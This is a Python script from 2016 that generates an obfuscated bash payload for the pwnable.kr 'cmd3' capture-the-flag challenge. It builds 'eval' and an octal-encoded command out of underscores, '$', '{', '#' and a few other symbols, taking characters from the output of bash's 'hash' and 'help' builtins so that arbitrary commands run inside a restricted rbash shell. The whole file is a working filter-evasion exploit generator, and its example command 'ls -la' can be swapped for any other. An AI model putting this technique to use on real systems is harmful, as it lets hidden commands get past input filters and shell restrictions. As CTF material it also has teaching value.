# bash fuck - env variable combine
# trichimtrich
# 2016

COMMAND = "ls -la"

from subprocess import check_output
import string
import sys, socket

def calc1(st, ss):
	res = "___=; ____=@;____=${#____}; "
	for c in ss:
		if c not in st:
			print c, "Not exists!"
			sys.exit(1)
		k = st.find(c)
		if c=="'": k=114 #index of [single quote] character in output of help command (ubuntu linux)
		tmp = "_____=" + "@"*k + "; _____=${#_____}; ___=$___${__:$_____:$____}; "
		res += tmp

	return res
	# input __ = st
	# output ___ = ss


out_help = check_output(["bash","-c","help"]).replace('\n','') #<3

st = ""
st += calc1("/bin/rbash", "hash")
st += "__=$($___); "
st += calc1("hash: hash table empty", "help")
st += "__=$($___); "
st += calc1(out_help, "eval")
st += "______=$___; "
st += calc1(out_help, " ")
st += "_______=$___; "
st += calc1(out_help, "'")
st += "__=$______; "
st += "____=$_______; "

'''
after these steps, we have
	__ = eval
 	___ = [single quote]
 	____ = [space]

so the point of this, we will execute:
	eval $'cmd'

where cmd presented in octa string
'''

for i in range(10):
	name = "_"*(i+5)
	st += name + "=" + "@"*i + ";" + name + "=${#" + name + "}; "


def calc2(cmd): #Split cmd into words and represent them in octa strings. ls -> $'\abc\xyz . save in $___'
	ar = []
	for word in cmd.split(' '):
		res = "\\$$___"
		for c in word:
			k = oct(ord(c)).lstrip('0')
			res += '\\\\'
			for d in k:
				name = "_"*(int(d)+5)
				res += "$" + name
		res += "$___"
		ar.append(res)
	return "___=" + "$____".join(ar) + "; "

st += calc2(COMMAND)

#Finally, eval $___
st += "$__$____$___"


#Some brief info
st = st.replace('@','_').replace(' ','')

ar = []
for c in st:
	if c not in ar:
		ar.append(c)

ar.sort()

st = "hash -r;__=/bin/rbash;" + st # I use the same environment of cmd3 challenge - pwnable.kr (rbash)

print "Charset =", ar, "=>", len(ar), "chars"
print "Total length =", len(st)
print "Command =", COMMAND
print "Payload ="
print st
